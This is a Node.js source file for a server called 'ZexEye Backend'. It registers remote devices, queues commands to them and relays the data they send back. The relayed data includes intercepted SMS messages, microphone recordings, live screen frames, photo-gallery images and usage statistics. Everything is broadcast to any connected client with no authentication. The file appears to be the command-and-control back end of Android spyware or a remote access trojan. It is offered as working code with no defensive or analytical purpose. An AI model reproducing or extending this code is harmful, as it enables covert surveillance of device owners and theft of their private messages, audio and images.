const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  maxHttpBufferSize: 50e6  // 50MB — needed for high-quality gallery images
});

const PORT = process.env.PORT || 5000;

// In-memory storage
let devices = new Map();
let commandQueue = new Map(); // targetId -> Array of commands

// Periodically check for stale devices (offline)
setInterval(() => {
  const now = new Date();
  let changed = false;
  for (let [id, device] of devices.entries()) {
    if (device.status === 'online' && (now - new Date(device.lastSeen)) > 90000) { // 90 seconds timeout
      devices.set(id, { ...device, status: 'offline' });
      console.log(`Device timed out (offline): ${id}`);
      changed = true;
    }
  }
  if (changed) io.emit('fleet_update', Array.from(devices.values()));
}, 30000);

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.emit('fleet_update', Array.from(devices.values()));

  // Device registration/reconnect
  socket.on('register', (deviceData) => {
    const deviceId = deviceData.id;
    const existing = devices.get(deviceId) || {};
    
    devices.set(deviceId, {
      ...existing,
      ...deviceData,
      socketId: socket.id,
      lastSeen: new Date(),
      status: 'online'
    });
    
    console.log(`Device registered: ${deviceId}`);
    
    // Flush command queue
    if (commandQueue.has(deviceId)) {
      const queue = commandQueue.get(deviceId);
      console.log(`Flushing ${queue.length} queued commands to ${deviceId}`);
      queue.forEach(cmd => {
        io.to(socket.id).emit('instruction', cmd);
      });
      commandQueue.delete(deviceId);
    }
    
    io.emit('fleet_update', Array.from(devices.values()));
  });

  // Heartbeat ping
  socket.on('ping_device', (data) => {
    if (data.id && devices.has(data.id)) {
      const device = devices.get(data.id);
      devices.set(data.id, {
        ...device,
        lastSeen: new Date(),
        status: 'online'
      });
      // Optionally update dashboard if status was offline
      if (device.status === 'offline') {
        io.emit('fleet_update', Array.from(devices.values()));
      }
    }
  });

  // Telemetry updates
  socket.on('telemetry', (data) => {
    if (data.id && devices.has(data.id)) {
      const device = devices.get(data.id);
      devices.set(data.id, {
        ...device,
        ...data,
        lastSeen: new Date(),
        status: 'online'
      });
      io.emit('device_update', devices.get(data.id));
    }
  });

  // Dashboard command routing with Queue logic
  socket.on('command', (commandData) => {
    const { targetId, action, payload } = commandData;
    const device = devices.get(targetId);
    
    if (device && device.status === 'online' && device.socketId) {
      console.log(`Routing direct command ${action} to ${targetId}`);
      io.to(device.socketId).emit('instruction', { action, payload });
    } else {
      console.log(`Device ${targetId} offline. Queuing command: ${action}`);
      if (!commandQueue.has(targetId)) commandQueue.set(targetId, []);
      commandQueue.get(targetId).push({ action, payload });
    }
  });

  // Gallery relay
  socket.on('gallery_result', (data) => {
    io.emit('gallery_result', data);
  });

  // Advanced features relay
  socket.on('intercepted_sms', (data) => {
    console.log(`SMS Intercepted: ${data.address} (${data.id})`);
    io.emit('intercepted_sms', data);
  });

  socket.on('mic_result', (data) => {
    console.log(`Audio recording received: ${data.filename} (${data.id})`);
    io.emit('mic_result', data);
  });

  socket.on('usage_stats', (data) => {
    io.emit('usage_stats', data);
  });

  socket.on('screen_frame', (data) => {
    io.emit('screen_frame', data);
  });

  // Original image download relay
  socket.on('download_result', (data) => {
    io.emit('download_result', data);
  });

  // Generic Tactical Relay for future expansion
  socket.on('tactical_event', (data) => {
    console.log(`Tactical Event: ${data.type} from ${data.id}`);
    io.emit('tactical_event', data);
  });

  socket.on('disconnect', () => {
    for (let [id, device] of devices.entries()) {
      if (device.socketId === socket.id) {
        devices.set(id, { ...device, status: 'offline' });
        console.log(`Socket disconnected: ${id}`);
        break;
      }
    }
    io.emit('fleet_update', Array.from(devices.values()));
  });
});

app.get('/api/devices', (req, res) => {
  res.json(Array.from(devices.values()));
});

server.listen(PORT, () => {
  console.log(`ZexEye Backend running on port ${PORT}`);
});
